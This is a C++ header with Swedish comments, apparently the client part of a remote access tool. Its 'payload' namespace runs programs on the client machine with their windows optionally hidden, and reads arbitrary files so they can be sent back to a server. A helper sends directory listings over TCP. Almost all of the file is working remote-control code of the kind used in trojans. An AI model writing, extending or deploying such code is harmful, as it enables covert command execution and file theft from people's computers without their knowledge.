#pragma once
#include "precompile.h"
#include "process.h"
#include "directory.h"

namespace helper { // olika hj�lp funktioner till klienten
	void send_directory(tcp_client c, std::vector<dir_item> items) {
		c.send({ "dir_status", std::to_string(items.size()) }); // skicka antal element i mappen
		for (auto [item, size] : items) {
			message msg{ "filedescription", item.string() + "|" + std::to_string(size) }; // skapa meddelande med fil namn och storlek
			c.send(msg);
			std::cout << "send()[" << msg.buffer() << "] - " << Error(0)<< std::endl;
		}
	}
	std::pair<std::string, std::string> ArgSplit(std::string args) { // splitar en str�ng vid mellanslaget till en std::pair

		auto found = args.find_first_of(' '); // f�rs�k hitta f�rsta separeringen

		if (found != std::string::npos) { // om lyckats
			return { args.substr(0, found), args.substr(found + 1) }; // splita vid separering
		}
		else { // annars retunera bara det sj�lvst�ende argumentet
			return { args, "" };
		}
	}
}

namespace payload { // payload funktioner som anv�nds f�r att utf�ra n�gonting p� klienten tex starta en process ta reda p� vem som �r inloggad

	bool process_execution(std::string program, bool hide) {
		STARTUPINFOA info = { sizeof(info) }; 
		PROCESS_INFORMATION process_info;
		info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		
		// om processen ska g�mmas s� g�m
		if (hide) { 
			info.wShowWindow = SW_HIDE;
		}
		else {
			info.wShowWindow = SW_NORMAL;
		}
		//skapa process
		if (!CreateProcessA(0, (LPSTR)program.c_str(), 0, 0, false, CREATE_NEW_PROCESS_GROUP | CREATE_NEW_CONSOLE, 0, 0, &info, &process_info))
		{
			return false;
		}
		else {
			// f�r att undvika handle l�cka
			CloseHandle(process_info.hProcess);
			CloseHandle(process_info.hThread);
			return true;
		}
	}

	// om processen ska skapas g�md
	std::string process_execution_hidden(std::string program) {
		if (!process_execution(program, true))
		{
			return std::to_string(GetLastError());
		}
		else {
			return "SUCCESS";
		}
	}

	// om processen ska skapas visande
	std::string process_execution_show(std::string program) {
		if (!process_execution(program, false))
		{
			return std::to_string(GetLastError());
		}
		else {
			return "SUCCESS";
		}
	}
	// om man vill ladda ner en fil fr�n klienten till servern
	std::string download_file(std::string program) {
		if (std::filesystem::exists(program) && !std::filesystem::is_directory(program)) { // om filen exsiterar och inte �r en mapp
			std::ifstream file(program, std::ios::binary); // l�s in filen bin�rt
			return std::string((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>()); // konvertera filen till en str�ng med itrator konstruktion
		}
		else {
			return "FAIL";
		}
	}

	
}

